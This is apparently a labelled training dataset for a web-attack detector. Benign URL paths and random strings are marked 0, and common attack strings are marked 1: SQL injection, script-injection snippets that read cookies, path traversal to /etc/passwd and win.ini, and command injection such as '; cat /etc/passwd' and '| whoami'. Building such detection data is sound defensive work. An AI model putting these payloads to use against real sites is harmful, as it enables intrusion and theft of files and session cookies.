../../../windows/win.ini,1
' OR 5=3 --,1
/search?id=5766,0
8StM1epvqS3EMSK,0
<script>alert(document.cookie)</script>,1
index,0
U9JXWwhCfib,0
VMKmG1UTuBwKb,0
/profile?session=80031,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/blog?id=4753,0
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=937;alert(a)</script>,1
' OR 7=6 --,1
' OR 8=7 --,1
<script>var a=455;alert(a)</script>,1
<script>var a=781;alert(a)</script>,1
/about?session=69053,0
Q6kUvJNsKapZYU,0
blog,0
/search?session=21628,0
search,0
/login?session=47683,0
/about?id=3240,0
../../../../etc/passwd,1
/about?session=10736,0
<script>var a=689;alert(a)</script>,1
../../../../etc/passwd,1
/home?id=2825,0
search,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
cAa96Fyx,0
onerror=alert(1),1
/cart?id=5023,0
' OR 1=1 --,1
fNaWKW6Xg,0
<script>var a=388;alert(a)</script>,1
/contact?session=24426,0
' OR 3=9 --,1
login,0
search,0
/blog?id=5240,0
/register?id=4383,0
/blog?id=3476,0
/about?id=1080,0
login,0
' OR 1=2 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=968;alert(a)</script>,1
' OR 1=4 --,1
' OR 1=1 --,1
/dashboard?id=7313,0
/contact?session=88121,0
<script>var a=205;alert(a)</script>,1
search,0
/login?session=97113,0
<script>var a=601;alert(a)</script>,1
/profile?id=3828,0
login,0
register,0
JCdbQPfejuq,0
/profile?session=26182,0
/contact?session=97553,0
<script>var a=146;alert(a)</script>,1
../../../../etc/passwd,1
| whoami,1
index,0
juGwSGwwgwVirDE,0
fp493phmM,0
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=636;alert(a)</script>,1
<script>var a=117;alert(a)</script>,1
' OR '1'='1,1
/login?session=65353,0
admin' --,1
oatDx1jZ,0
register,0
<script>var a=520;alert(a)</script>,1
../../../windows/win.ini,1
/blog?id=1841,0
<script>var a=318;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=631;alert(a)</script>,1
' OR 7=8 --,1
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
onerror=alert(1),1
cpy53WDsjA,0
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
If5nFCWHdj,0
/login?session=93585,0
javascript:alert(1),1
cs7Rv5VfSKSgt,0
/cart?id=2895,0
/contact?id=7565,0
' OR 1=9 --,1
<script>var a=353;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=543;alert(a)</script>,1
../../../../etc/passwd,1
contact,0
<script>var a=286;alert(a)</script>,1
' OR 9=9 --,1
DGxzWuWQ3Hbje,0
admin' --,1
search,0
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
x4unFcCjB9rdDn,0
<script>var a=122;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=4 --,1
/index?session=81382,0
admin' --,1
/user?id=4753,0
/register?session=86576,0
' OR '1'='1,1
/about?id=2532,0
search,0
/profile?session=40697,0
' OR 6=4 --,1
; cat /etc/passwd,1
81ouU1XsgmbI,0
home,0
/search?id=4803,0
y4szzOVZsEsXH,0
admin'/* bypass */OR 1=1,1
' OR 5=3 --,1
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
profile,0
/index?session=51940,0
/checkout?id=2944,0
<script>var a=568;alert(a)</script>,1
profile,0
/contact?session=31128,0
WGiasUW9T2g,0
8GipOi8iz6D,0
aewp54Rmh6,0
login,0
admin%00' OR 1=1,1
<script>var a=194;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
| whoami,1
/home?id=446,0
search,0
<script>alert(document.cookie)</script>,1
XzmCl586NS1,0
' OR 1=1 --,1
settings,0
mgwQfOWiC,0
/blog?id=2265,0
uBiwWa2A3,0
/user?id=5883,0
javascript:alert(1),1
../../../../etc/passwd,1
<script>var a=72;alert(a)</script>,1
search,0
<script>var a=976;alert(a)</script>,1
login,0
' OR 1=2 --,1
checkout,0
/login?id=8213,0
IyxLMec4T5JHOPw,0
index,0
/home?id=3781,0
<script>var a=576;alert(a)</script>,1
admin' --,1
home,0
1' o r '1'='1,1
<script>var a=419;alert(a)</script>,1
/user?id=7157,0
checkout,0
xio3hv7y,0
login,0
/home?id=2616,0
<script>alert(document.cookie)</script>,1
search,0
' OR 1=7 --,1
<script>var a=133;alert(a)</script>,1
onerror=alert(1),1
/blog?id=2422,0
index,0
s E l E c T * f R o M a d m i n,1
../../../windows/win.ini,1
/login?session=10879,0
' OR 7=1 --,1
kDE3E7I9Y58w,0
' OR '1'='1,1
/cart?session=27146,0
javascript:alert(1),1
rBs6meCnOL,0
' OR '1'='1,1
/profile?id=1462,0
<script>var a=412;alert(a)</script>,1
581RjUtHOVdKL,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
gGek92532CZvT,0
seMNpCHYQ,0
/cart?id=5359,0
admin%00' OR 1=1,1
<script>var a=14;alert(a)</script>,1
/settings?id=4901,0
; cat /etc/passwd,1
contact,0
<script>var a=367;alert(a)</script>,1
user,0
20eUDIY97,0
1' o r '1'='1,1
/cart?session=21269,0
/register?id=5007,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
lI0KFzNz6iTK,0
dashboard,0
/index?session=69282,0
6nNrhKasvK7k,0
/profile?session=87381,0
' OR 1=9 --,1
/home?session=42226,0
zW5FYd6hxUq,0
' OR 1=7 --,1
/search?id=6561,0
login,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
/index?id=2488,0
/profile?session=29378,0
' OR 3=7 --,1
xpThoiisXipir,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=348;alert(a)</script>,1
' OR 8=8 --,1
/dashboard?id=1241,0
aFtruq7BWwH,0
1' o r '1'='1,1
<script>var a=747;alert(a)</script>,1
search,0
<script>var a=749;alert(a)</script>,1
admin' --,1
profile,0
' OR 5=5 --,1
/blog?id=9208,0
' OR 8=6 --,1
/checkout?session=79700,0
1' o r '1'='1,1
sBnmzwJMKdlL,0
onerror=alert(1),1
pF1hb3dkGGo0CLp,0
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=4370,0
/checkout?session=11539,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
s E l E c T * f R o M a d m i n,1
/login?session=71619,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
<script>var a=925;alert(a)</script>,1
<script>var a=704;alert(a)</script>,1
nSVPYlcojAhN1cj,0
Gu0lXj3EV,0
admin%00' OR 1=1,1
javascript:alert(1),1
register,0
login,0
../../../../etc/passwd,1
search,0
admin'/* bypass */OR 1=1,1
checkout,0
about,0
b3NDePZZvr507M,0
admin%00' OR 1=1,1
/register?id=9022,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
' OR 2=4 --,1
vu69dXfSj15,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
/user?id=4061,0
' OR 8=5 --,1
/dashboard?id=9067,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
87OTrDTDe,0
<script>alert(document.cookie)</script>,1
/profile?id=112,0
index,0
apWhyMrpXKo5G,0
/index?session=59231,0
f9Dqqw6Seyz,0
' OR 1=1 --,1
/contact?id=2627,0
' OR 2=9 --,1
/search?id=4993,0
admin' --,1
/cart?session=98057,0
search,0
<script>alert(document.cookie)</script>,1
/dashboard?id=235,0
' OR 5=4 --,1
/contact?session=82450,0
/register?id=3811,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
javascript:alert(1),1
/profile?id=6546,0
/checkout?id=2989,0
| whoami,1
HfvrSIxfD,0
onerror=alert(1),1
login,0
' OR 9=4 --,1
about,0
cart,0
/contact?id=3941,0
/settings?id=1399,0
KWD6w56hq8boV,0
../../../windows/win.ini,1
' OR 4=9 --,1
/about?id=7364,0
' OR 1=1 --,1
settings,0
<script>var a=440;alert(a)</script>,1
<script>var a=448;alert(a)</script>,1
profile,0
JqNIHAh1Ka,0
/checkout?session=75108,0
P2toHyCKSKr,0
<script>var a=506;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/settings?session=49925,0
' OR 2=6 --,1
/profile?id=515,0
/dashboard?session=35388,0
' OR 1=2 --,1
admin'/* bypass */OR 1=1,1
/register?session=21147,0
s E l E c T * f R o M a d m i n,1
<script>var a=662;alert(a)</script>,1
rDfABUEQcJiFtt,0
/profile?session=13276,0
/search?id=7591,0
/home?id=638,0
admin' --,1
PMCFTGUjGKA,0
/index?session=36289,0
<script>var a=363;alert(a)</script>,1
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
RDAdXA1KTUJTkku,0
<script>var a=17;alert(a)</script>,1
<script>var a=428;alert(a)</script>,1
onerror=alert(1),1
| whoami,1
home,0
<script>var a=810;alert(a)</script>,1
settings,0
' OR 8=1 --,1
/checkout?session=10196,0
admin' --,1
' OR 3=5 --,1
/home?session=77996,0
; cat /etc/passwd,1
7XagAvAtmv,0
dashboard,0
<script>var a=955;alert(a)</script>,1
' OR 9=9 --,1
' OR 4=4 --,1
/cart?id=7574,0
' OR 1=1 --,1
/user?session=31397,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
admin' --,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=406;alert(a)</script>,1
1' o r '1'='1,1
FlwFk0C90,0
<script>var a=427;alert(a)</script>,1
' OR 9=1 --,1
about,0
profile,0
javascript:alert(1),1
/about?session=77339,0
<script>var a=797;alert(a)</script>,1
AVjJ90MdUO0ygT,0
admin'/* bypass */OR 1=1,1
<script>var a=997;alert(a)</script>,1
| whoami,1
' OR 3=4 --,1
about,0
| whoami,1
register,0
/contact?id=4818,0
| whoami,1
home,0
<script>alert(document.cookie)</script>,1
/search?id=5649,0
s E l E c T * f R o M a d m i n,1
<script>var a=830;alert(a)</script>,1
cart,0
B3p35PaIctpzj,0
S2PjhVCQf1pu,0
<script>var a=76;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=988;alert(a)</script>,1
../../../windows/win.ini,1
<script>var a=324;alert(a)</script>,1
<script>var a=12;alert(a)</script>,1
pAyNyaul,0
/blog?id=7478,0
/register?session=11222,0
47qntswsBJ3,0
' OR 2=1 --,1
settings,0
/login?id=2269,0
<script>var a=141;alert(a)</script>,1
contact,0
home,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
/index?id=5365,0
/contact?id=6136,0
<script>var a=506;alert(a)</script>,1
/blog?id=4467,0
1' o r '1'='1,1
javascript:alert(1),1
/user?id=3103,0
DyQLMeCle3,0
../../../../etc/passwd,1
; cat /etc/passwd,1
/register?id=3799,0
27UDFq703D3GF8,0
/profile?id=8330,0
<script>var a=946;alert(a)</script>,1
| whoami,1
contact,0
' OR 1=1 --,1
home,0
/register?session=76726,0
/settings?session=60650,0
; cat /etc/passwd,1
/contact?id=2633,0
<script>var a=7;alert(a)</script>,1
' OR 7=9 --,1
user,0
<script>var a=20;alert(a)</script>,1
dGsTvvGK75,0
/user?session=55385,0
../../../../etc/passwd,1
/user?id=912,0
/profile?session=78030,0
<script>var a=656;alert(a)</script>,1
eZvZckVFsCYt1C,0
/profile?id=8725,0
' OR 1=4 --,1
/settings?id=3935,0
onerror=alert(1),1
' OR 7=9 --,1
' OR 1=1 --,1
' OR 2=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?session=65895,0
/user?id=1800,0
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
| whoami,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
' OR 1=1 --,1
VSfxCyil,0
' OR '1'='1,1
/index?session=38350,0
contact,0
checkout,0
login,0
soJTarTQnD,0
/settings?session=64870,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=9 --,1
home,0
VuwlgsYkgQCsS2b,0
<script>var a=669;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=480;alert(a)</script>,1
/checkout?id=330,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
onerror=alert(1),1
home,0
/blog?id=6415,0
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
/checkout?session=57544,0
/cart?session=28591,0
profile,0
login,0
search,0
/dashboard?session=28837,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
index,0
rZBDaEi82J4VSc,0
wrA1lqNVWx90Fx,0
../../../windows/win.ini,1
' OR 2=2 --,1
index,0
/about?session=53792,0
/contact?id=1270,0
NUR4ikAxm,0
settings,0
../../../windows/win.ini,1
/home?session=79643,0
| whoami,1
| whoami,1
/blog?session=94614,0
index,0
' OR 1=1 --,1
<script>var a=842;alert(a)</script>,1
javascript:alert(1),1
/login?id=4506,0
/login?session=85784,0
/cart?id=3607,0
home,0
/contact?session=83234,0
/about?id=3672,0
/contact?session=82864,0
| whoami,1
' OR '1'='1,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
/settings?session=44675,0
' OR 1=4 --,1
' OR 5=1 --,1
/home?session=38235,0
<script>var a=673;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/login?id=5297,0
/login?session=17130,0
YABwsr63ors,0
cart,0
/about?id=3134,0
/home?session=89380,0
| whoami,1
/profile?id=119,0
s E l E c T * f R o M a d m i n,1
/user?id=4137,0
| whoami,1
/index?id=8546,0
' OR 1=8 --,1
home,0
2voNbbNFZF18,0
' OR 4=2 --,1
settings,0
' OR '1'='1,1
cart,0
<script>var a=559;alert(a)</script>,1
/login?id=9696,0
50YUsHtpx,0
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
/checkout?session=87208,0
cart,0
| whoami,1
../../../windows/win.ini,1
/home?session=66475,0
/user?id=894,0
index,0
8qMPV0fs0KyISK,0
<script>var a=536;alert(a)</script>,1
/checkout?session=29224,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
' OR 3=1 --,1
<script>var a=477;alert(a)</script>,1
' OR '1'='1,1
admin'/* bypass */OR 1=1,1
' OR 2=5 --,1
pq8h7QSrlId1,0
/search?session=55605,0
<script>var a=749;alert(a)</script>,1
/search?session=88825,0
/login?session=70813,0
/user?session=72655,0
../../../windows/win.ini,1
xRlnQxzkhwyTS,0
/search?id=9416,0
/about?session=52972,0
' OR '1'='1,1
/settings?id=3246,0
/user?id=3223,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
f7DQw9zzW5i3,0
/about?id=6795,0
/dashboard?session=18061,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
' OR '1'='1,1
i8qIY8LwDqRF,0
../../../../etc/passwd,1
/dashboard?session=66693,0
onerror=alert(1),1
' OR 1=1 --,1
8oq6rp0z,0
index,0
javascript:alert(1),1
/login?id=2120,0
TFKGAa5Hj,0
user,0
' OR 2=3 --,1
/contact?session=86684,0
/search?session=77292,0
home,0
<script>var a=320;alert(a)</script>,1
1' o r '1'='1,1
admin%00' OR 1=1,1
<script>var a=411;alert(a)</script>,1
<script>var a=799;alert(a)</script>,1
<script>var a=129;alert(a)</script>,1
IXgbbjjH,0
/search?id=2881,0
<script>var a=604;alert(a)</script>,1
/profile?id=2939,0
/settings?session=79755,0
/home?id=5285,0
checkout,0
/checkout?session=97460,0
/home?session=89858,0
dashboard,0
<script>var a=485;alert(a)</script>,1
1' o r '1'='1,1
/index?id=5258,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
../../../../etc/passwd,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
/index?session=39582,0
/home?id=8254,0
/profile?id=2546,0
contact,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/register?id=8307,0
r1Gsejyu1y5B4WO,0
1' o r '1'='1,1
; cat /etc/passwd,1
' OR 1=5 --,1
WE1WMADT,0
YHxRgginbvNLu1,0
cart,0
/index?id=5584,0
| whoami,1
/profile?session=95646,0
ijzS1RvLag,0
onerror=alert(1),1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
cart,0
' OR 2=7 --,1
/search?session=47732,0
| whoami,1
' OR 1=1 --,1
<script>var a=581;alert(a)</script>,1
' OR 8=8 --,1
<script>var a=870;alert(a)</script>,1
/register?id=4803,0
/checkout?session=60789,0
onerror=alert(1),1
index,0
admin'/* bypass */OR 1=1,1
/blog?id=9375,0
contact,0
../../../windows/win.ini,1
<script>var a=706;alert(a)</script>,1
dashboard,0
/home?session=84917,0
I9ESuShE1pzDcZg,0
../../../windows/win.ini,1
<script>var a=267;alert(a)</script>,1
| whoami,1
/register?id=7774,0
; cat /etc/passwd,1
' OR 3=5 --,1
<script>var a=732;alert(a)</script>,1
<script>var a=941;alert(a)</script>,1
/blog?session=33220,0
qnhdZ6vm,0
admin'/* bypass */OR 1=1,1
search,0
<script>var a=595;alert(a)</script>,1
/settings?session=36821,0
weksjleeakm8SHJ,0
/checkout?session=42743,0
/profile?id=4769,0
/login?id=687,0
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?id=4095,0
onerror=alert(1),1
/checkout?session=98109,0
/about?id=6583,0
' OR 1=1 --,1
AR70rP9rT,0
bw63NaOG,0
' OR 4=7 --,1
/about?session=29321,0
admin'/* bypass */OR 1=1,1
/user?session=64670,0
; cat /etc/passwd,1
cart,0
admin'/* bypass */OR 1=1,1
/profile?session=37747,0
' OR 1=1 --,1
/user?id=900,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
buWKiLxzwZ,0
' OR '1'='1,1
hRNLd2mgV,0
/index?id=6309,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
<script>var a=609;alert(a)</script>,1
javascript:alert(1),1
javascript:alert(1),1
' OR 2=9 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
javascript:alert(1),1
0TSLJnM8hBiG,0
/about?id=1554,0
<script>var a=559;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
login,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?session=47629,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
home,0
/contact?session=92519,0
' OR 1=9 --,1
<script>var a=333;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
/cart?id=2448,0
' OR 1=6 --,1
<script>alert(document.cookie)</script>,1
| whoami,1
| whoami,1
/search?session=31331,0
/dashboard?id=3428,0
i5z9mhRv34J,0
' OR '1'='1,1
/dashboard?session=87050,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
/about?id=6951,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
/profile?session=26015,0
sdLgVb11,0
/login?id=9604,0
s E l E c T * f R o M a d m i n,1
/settings?id=2525,0
/blog?session=83170,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
IUUCcf8DCXD,0
/home?id=7196,0
s E l E c T * f R o M a d m i n,1
y7MvMB5IVR7CLN1,0
admin' --,1
/checkout?session=47640,0
<script>var a=245;alert(a)</script>,1
/index?id=576,0
/about?session=38165,0
about,0
/search?session=18270,0
| whoami,1
/checkout?session=52228,0
0h8zVw8M6vkQGv1,0
<script>var a=723;alert(a)</script>,1
/cart?session=19999,0
/login?session=73231,0
<script>var a=988;alert(a)</script>,1
; cat /etc/passwd,1
' OR 3=8 --,1
<script>var a=778;alert(a)</script>,1
/index?id=573,0
/cart?session=76802,0
4zGRbMxUwi,0
register,0
settings,0
' OR 6=5 --,1
home,0
onerror=alert(1),1
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
rXEbIdwHkPY,0
index,0
2aV9SDiQWjwd,0
; cat /etc/passwd,1
/search?id=3438,0
../../../windows/win.ini,1
/dashboard?session=84708,0
' OR 6=5 --,1
BkTJ6ReK7aRuHYH,0
cart,0
<script>var a=573;alert(a)</script>,1
contact,0
admin' --,1
/about?session=37233,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
/login?session=10985,0
/login?id=1588,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=2 --,1
s E l E c T * f R o M a d m i n,1
search,0
../../../windows/win.ini,1
| whoami,1
onerror=alert(1),1
/login?session=20256,0
' OR 1=1 --,1
' OR 2=7 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=242;alert(a)</script>,1
<script>var a=529;alert(a)</script>,1
HZkatsr1KF,0
/settings?session=33237,0
Os87VEb7,0
EjGOKnQDpb4m,0
onerror=alert(1),1
| whoami,1
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
javascript:alert(1),1
| whoami,1
' OR 2=7 --,1
RsKpYTjoC,0
javascript:alert(1),1
/blog?session=73740,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/user?id=2883,0
' OR 1=1 --,1
/home?id=1398,0
; cat /etc/passwd,1
<script>var a=61;alert(a)</script>,1
admin' --,1
<script>var a=143;alert(a)</script>,1
../../../windows/win.ini,1
/home?id=6749,0
/profile?id=2291,0
/index?id=101,0
/contact?id=4231,0
' OR '1'='1,1
/dashboard?id=6634,0
BNi7zvLz7DGg5Rg,0
/user?id=3747,0
<script>var a=303;alert(a)</script>,1
search,0
| whoami,1
home,0
<script>var a=6;alert(a)</script>,1
contact,0
aikgur7gxVekE,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
/blog?session=69560,0
settings,0
/index?id=7453,0
/user?id=8472,0
/contact?id=9872,0
profile,0
LGf03exXE,0
/settings?id=8068,0
PpI7iNNNb,0
dashboard,0
<script>var a=989;alert(a)</script>,1
blog,0
' OR 1=1 --,1
/user?id=8292,0
settings,0
admin'/* bypass */OR 1=1,1
/about?id=3332,0
NsiVTc7Tn753C,0
' OR 6=1 --,1
dashboard,0
<script>var a=26;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
jtJT8Lhd,0
nUje8DF55BCjVlt,0
AFGDjPB2ik4,0
../../../../etc/passwd,1
/register?id=9504,0
rvZUbIDP3Ll0nF,0
<script>var a=224;alert(a)</script>,1
/index?id=7773,0
cart,0
/index?id=44,0
; cat /etc/passwd,1
' OR 9=2 --,1
<script>var a=352;alert(a)</script>,1
/dashboard?id=7751,0
/index?session=81288,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
<script>var a=636;alert(a)</script>,1
/register?id=4165,0
<script>var a=704;alert(a)</script>,1
' OR 4=6 --,1
<script>alert(document.cookie)</script>,1
/settings?session=14142,0
settings,0
home,0
UOeAeFzeFuhSU,0
<script>var a=358;alert(a)</script>,1
' OR 2=9 --,1
dashboard,0
mpXVBcaHpjqg,0
1' o r '1'='1,1
/checkout?session=77952,0
zpLcaEC6sbD,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?session=14427,0
/home?session=27519,0
/cart?session=95089,0
/about?session=89192,0
javascript:alert(1),1
../../../../etc/passwd,1
<script>var a=767;alert(a)</script>,1
/contact?id=5504,0
../../../windows/win.ini,1
' OR 5=6 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=882;alert(a)</script>,1
yTNhvZzo0YK,0
/search?id=4613,0
home,0
' OR 8=3 --,1
9RImOxEpbds,0
/index?id=9140,0
' OR 8=3 --,1
1' o r '1'='1,1
/settings?id=354,0
' OR 3=7 --,1
/profile?id=2332,0
' OR 8=9 --,1
s E l E c T * f R o M a d m i n,1
4CGaAEee29,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?session=33676,0
search,0
1' o r '1'='1,1
/about?session=95521,0
/login?session=94472,0
' OR 8=6 --,1
/checkout?session=83686,0
/dashboard?id=6909,0
' OR 1=1 --,1
/index?session=74963,0
<script>var a=960;alert(a)</script>,1
dashboard,0
settings,0
../../../windows/win.ini,1
' OR 7=7 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=5081,0
<script>var a=988;alert(a)</script>,1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=8 --,1
t6yMZgGyd,0
../../../../etc/passwd,1
/checkout?id=3246,0
onerror=alert(1),1
' OR 3=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
ZmoU42rP,0
/search?id=3555,0
/search?id=9149,0
checkout,0
s E l E c T * f R o M a d m i n,1
W93gYuipH94a,0
/about?id=6952,0
javascript:alert(1),1
' OR 7=4 --,1
<script>var a=598;alert(a)</script>,1
<script>var a=881;alert(a)</script>,1
<script>var a=27;alert(a)</script>,1
/index?id=6480,0
/settings?session=44780,0
EHb5Zyq85uJNL,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=286;alert(a)</script>,1
/login?id=2206,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?session=50527,0
' OR 2=9 --,1
/settings?session=23331,0
register,0
/blog?session=43619,0
/about?session=83716,0
/user?id=2755,0
login,0
/checkout?session=22808,0
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
/index?session=16004,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
register,0
/settings?session=34269,0
' OR 9=7 --,1
<script>var a=683;alert(a)</script>,1
about,0
' OR 4=4 --,1
/user?id=2618,0
admin%00' OR 1=1,1
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
/about?id=6114,0
index,0
admin%00' OR 1=1,1
ikBSqJwGqOeom,0
<script>var a=843;alert(a)</script>,1
blog,0
<script>var a=678;alert(a)</script>,1
about,0
' OR 1=4 --,1
register,0
onerror=alert(1),1
qnV8eUo7,0
s E l E c T * f R o M a d m i n,1
search,0
settings,0
<script>var a=923;alert(a)</script>,1
/search?session=60754,0
' OR 1=5 --,1
profile,0
admin' --,1
NeZER2a01AtSo,0
/index?id=1293,0
<script>alert(document.cookie)</script>,1
' OR 6=4 --,1
1' o r '1'='1,1
/settings?id=5609,0
z94QftUeal,0
<script>var a=945;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/index?session=41369,0
/index?id=818,0
search,0
admin' --,1
/contact?id=829,0
wkIuoSrielmLS9k,0
5QRvOl2LRgO,0
javascript:alert(1),1
/register?id=2449,0
4gvdXqXBtp442R,0
<script>var a=40;alert(a)</script>,1
u5LGCBhkXX,0
/blog?session=73820,0
/blog?id=7983,0
<script>var a=306;alert(a)</script>,1
Gs1OKNxov,0
/search?id=6318,0
z0Gmq3KnztbL,0
<script>var a=276;alert(a)</script>,1
<script>var a=610;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
<script>var a=684;alert(a)</script>,1
<script>var a=872;alert(a)</script>,1
' OR '1'='1,1
yKRuwr78o1tne,0
/contact?id=6294,0
../../../../etc/passwd,1
QuBbrMnEexWeRp,0
search,0
user,0
| whoami,1
' OR 1=1 --,1
onerror=alert(1),1
javascript:alert(1),1
' OR '1'='1,1
; cat /etc/passwd,1
3X8veWFQDMXP,0
LHvyGNxd,0
login,0
uiTFalhuSoQXp,0
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
login,0
/register?session=11759,0
<script>var a=433;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
<script>var a=967;alert(a)</script>,1
hdSU0rITrA,0
/cart?id=6272,0
settings,0
/cart?session=56104,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
cart,0
sPW5uC3eiXvI,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
' OR 3=5 --,1
/dashboard?id=2574,0
../../../../etc/passwd,1
../../../../etc/passwd,1
' OR 1=6 --,1
' OR 2=7 --,1
javascript:alert(1),1
' OR 7=5 --,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=235;alert(a)</script>,1
user,0
1' o r '1'='1,1
/profile?id=3698,0
/blog?id=5157,0
onerror=alert(1),1
1' o r '1'='1,1
onerror=alert(1),1
profile,0
admin%00' OR 1=1,1
' OR 7=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 5=8 --,1
1ooZy7a6Bev2,0
